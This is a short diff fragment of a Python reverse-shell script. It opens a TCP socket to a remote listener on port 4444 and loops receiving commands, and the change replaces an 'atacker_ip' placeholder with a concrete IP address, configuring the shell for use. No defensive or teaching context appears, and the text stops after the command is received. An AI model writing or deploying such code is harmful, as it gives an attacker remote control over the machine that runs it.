@@ -3,7 +3,7 @@ import subprocess
 
 def run():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("atacker_ip", 4444))
+    s.connect(("192.168.176.158", 4444))
 
     while True:
         command = s.recv(1024).decode()
